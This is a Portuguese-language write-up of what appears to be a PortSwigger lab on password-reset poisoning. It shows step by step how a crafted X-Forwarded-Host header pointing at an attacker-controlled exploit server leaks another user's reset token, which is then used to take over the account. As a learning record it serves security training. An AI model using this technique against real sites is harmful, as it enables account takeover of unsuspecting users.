## Objetivo
Manipular o header do alvo com X-Forwarded-Host para o meu dominio VPS e capturar o link de reset do Carlos.
Para esse alvo nem é necessário usar as credenciais de wiener:peter

## Vulnerabilidade Identificada
O servidor usa o valor do X-Forwarded-Host sem validação para construir o link de reset. 
falta de sanitização/validação de input no backend.


## Comandos Utilizados
``instruções de como eu fiz``
1. Pedi o reset de senha para o user Carlos interceptando com o burp
2. Joguei a request no repeater e adicionei um header manipulado para meu dominio VPS nesse caso o exploit pré configurado do portswigger.
   Header adicionado 
   ``X-Forwarded-Host: exploit-0a04002303f90c0c808a02ac018600bf.exploit-server.net``
3. Após isso foi só olhar em Logs do VPS server e encontrar o link com o token
4. copiei o get inteiro ``/forgot-password?temp-forgot-password-token=jhxdynkkovw7btoa0zh5eejacvyxwhpm`` e colei na url do alvo diretamente
5. Após cair direto na pagina de reset de senha, mudei a senha de carlos e fiz login

## Resultado
<img width="1920" height="1002" alt="Screenshot From 2026-04-25 08-29-36" src="https://github.com/user-attachments/assets/b02f09fc-4b30-402e-934f-92bab1a03127" />
<br>
<img width="1917" height="928" alt="image" src="https://github.com/user-attachments/assets/deeb9955-4f04-4f98-98ca-25936db3deca" />
<br>

## Lições Aprendidas
Aprendi sobre host header poisoning. quando o servidor confia em headers controláveis pelo cliente para gerar URLs dinâmicas, 
permitindo redirecionar fluxos sensíveis para domínio do atacante.
